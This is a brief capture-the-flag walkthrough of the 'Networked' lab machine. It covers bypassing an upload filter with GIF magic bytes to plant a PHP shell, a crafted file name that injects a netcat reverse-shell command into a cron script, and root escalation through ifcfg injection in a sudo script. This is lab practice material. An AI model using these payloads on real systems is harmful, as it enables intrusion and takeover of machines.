# 📳 Networked

## Enumeration

We see it has a website

We perform dirbuster

We get an archive backup

We extract it

We get source code

We see that upload.php Only supports Gif Files

and it uses magic bytes also too cross check it ( The first chr of the file)

So we add magic bytes of GIF to first line of our php shell dcript

ex-

```
GIF87a
```

or

```
GIF89a
```

We get an Apache shell

As we got into box we will now extract user.txt but we dont have permission so we will have to do lateral movement to other user which has read rights.

after going through user guly directory we found cron job which can help us to get into user guly from apache.

<figure><img src="https://miro.medium.com/v2/resize:fit:388/1*9wEse-hxxwX0XGERLRrmDg.png" alt="" height="83" width="388"><figcaption></figcaption></figure>

Meaning every 3min it runs this script

Upon analyzing the script we see $name which means name of the file

So what we can do create an empty file in the uploads folder

```
touch — ‘;nc -c bash 10.10.14.30 4321;.php’
```

After 3 minutes we will get shell as guly user and then we can extract user.txt flag.

<figure><img src="https://miro.medium.com/v2/resize:fit:542/1*yOC_tX7O_aFeXMeRLSr8LA.png" alt="" height="200" width="542"><figcaption></figcaption></figure>

Now we have to go-ahead for root flag and we will start with privilege escalation.

As i always do sudo -l & -i which is easy to get in root tricks.

Gully user can run sudo command for changename.sh

<figure><img src="https://miro.medium.com/v2/resize:fit:599/1*8P8DW13esaUr8s0IkaMEYw.png" alt="" height="217" width="599"><figcaption></figcaption></figure>

So we check changename.sh and we just have read right for this file after doing google on ifcfg network we found trick to get in.

{% embed url="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f" %}

<figure><img src="https://miro.medium.com/v2/resize:fit:672/1*AlxfAv82ATZ2F1ZI8CGlAg.png" alt="" height="354" width="672"><figcaption></figcaption></figure>

So we will run the file with sudo and provide junk data as below.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*eiiDlU5_YTez3m_wLSs-iA.png" alt="" height="477" width="700"><figcaption></figcaption></figure>

**This is imp !!**

interface BROWSER\_ONLY:\
ram **bash**

Here bash plays a very imp role to get in as root user and we root flag as above
